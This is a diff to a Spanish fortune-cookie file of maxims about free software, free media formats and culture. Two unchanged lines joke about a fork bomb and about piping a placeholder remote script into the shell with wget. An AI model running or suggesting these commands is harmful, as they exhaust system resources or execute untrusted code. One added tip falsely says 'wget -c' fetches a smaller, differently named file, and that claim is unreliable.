@@ -542,6 +542,8 @@ El verdadero valor del código lo da el compartirlo con una Comunidad, para que 
 %
 Mantener en secreto la información es ineficiente; obliga a una antiestética duplicación de esfuerzo.
 %
+La información quiere ser libre.
+%
 Nuestra Cultura es permeable a los cambios, y desde el Martín Fierro hasta el libro más risueño, hemos de leerlo y compartirlo por Torrent.
 %
 El Pueblo debe tener libre acceso a todas las fuentes y manifestaciones de la cultura y de la educación, y esto incluye los contenidos digitales en las redes de datos.
@@ -976,7 +978,23 @@ MIDI propuso un código fuente estándar para la música computada, parte de un 
 %
 El sonido digitalizado comprende un muestreo numérico de vibraciones sonoras (con o sin compresión por pérdida), y como tales, los datos ocupan una cuantiosa cantidad de memoria en el ordenador.
 %
+Distribuye la mayoría de tus ficheros de audio en el formato Ogg Vorbis. A diferencia de MP3, este ha sido siempre completamente libre y sin patentes encumbradas.
+%
+Obtendrás buena calidad de voz con la codificación monoural Ogg Vorbis de 64 kilobytes por segundo.
+%
+Los ficheros de sonido Ogg codificados en un stream de 20 kilobytes por segundo permiten que la mayoría de los usuarios de Internet puedan escucharlos al vuelo.
+%
+No son pocos los ficheros de audio codificados en el formato libre Opus, que soporta alta calidad de audio y baja latencia.
+%
 Flac es un buen formato de audio con compresión sin pérdida, y es adecuado para música. Pero como en el peronismo, el secreto está en la mezcla.
+%
+Distribuye la mayoría de tus ficheros de video codificados con el códec de video Theora, encapsulado en una capa de transporte Ogg. Ocasionalmente estos tiene la extensión .ogv o .ogm, pero también pueden compartir la extensión .ogg con los dichos ficheros de audio.
+%
+El códec de video Theora fue diseñado como un códec de video libre no encumbrado por patentes ni restricciones de licenciamiento.
+%
+La brillantez técnica del códec de video Theora no sólo permite tasas de supercompresión, sino que respeta la liberta de sus usuarios.
+%
+Recurre con confianza al formato de video WebM (con códec de video VP8 o VP9), puesto que no se encuentra encumbrado por patentes de software conocidas.
 %
 El Software Libre se basa en cuatro libertades interrelacionadas: la de usar el programa, ver su código (y modificarlo), copiarlo, y distribuirlo a la Comunidad. Por contraposición, el mundo capitalista ha entendido que estas libertades deben ser cercenadas por medio de licencia-acuerdo de usuario final (EULA), conformando un software privativo, en el cual sólo propugnan el uso del programa, evitando todo lo demás.
 %
@@ -1325,6 +1343,10 @@ Los datos de los trabajadores resultan vendidos a corporaciones para alimentar a
 Se vence con Inteligencia y Organización, no con inteligencia "artificial".
 %
 La Inteligencia Artificial debe ir a lavar los platos, para que nosotros podamos volcarnos al arte, y no hacer arte para que nosotros tengamos que ir a lavar los platos.
+%
+Desmitificar la Inteligencia Artificial reducirá inevitablemente su atractivo.
+%
+Disipando el aura de magia que rodea la Inteligencia Artificial reduciremos su nivel de adopción.
 %
 Un ordenador nunca puede ser considerado responsable, por lo tanto, nunca debe tomar decisiones de gestión.
 %
@@ -3792,7 +3814,7 @@ Cualquier programa privativo dado, cuesta y tarda más.
 %
 Si un programa privativo es útil, habrá de ser modificado.
 %
-Si un programa privativo es inútil, será frondosamente documentado.
+Todo programa privativo inútil, vendrá frondosamente documentado.
 %
 Cualquier programa privativo se expandirá hasta ocupar toda la memoria disponible.
 %
@@ -5232,6 +5254,8 @@ Usa la orden de shell :(){:|:&};: para ocupar recursivamente recursos informáti
 %
 Utiliza wget http://codigo_maligno -O- | sh para correr telemáticamente un script maligno.
 %
+Utiliza wget -c para descargar - si existiese - un fichero más pequeño con distinta extensión a la provista en la dirección de descarga. Esto te será útil para descargar el fichero de video de calidadl inferior.
+%
 No es labor de Unix impedir que el root se de un tiro en el pie.
 %
 Desprograma la obsolescencia con software libre.
@@ -5643,7 +5667,7 @@ Quien todo lo descarga, todo lo pierde.
 %
 A veces se descarga, a veces se carga.
 %
-No es amigo quien descarga, sino quien da a descargar.
+No es compañero quien descarga, sino quien da a descargar.
 %
 No puedes descargarlo todo ¿Dónde lo meterías?
 %
@@ -6406,7 +6430,7 @@ Comparte enlaces legibles simples, tales como misitioweb.com/ideas. Estos enlace
 %
 En las redes de datos, rechaza todo espacio claustrofóbicos, con barreras que impiden construir, poseer y controlar.
 %
-Escapa de todos aquellos vericuetos en la red tras los cuales sólo puedes consumir.
+Escapa de todos aquellos vericuetos de la red en los cuales sólo puedes consumir.
 %
 En los Pubnix tendrás mayor elección de tu público, ya sea posteando en privado o controlando tu alcance y audiencia.
 %
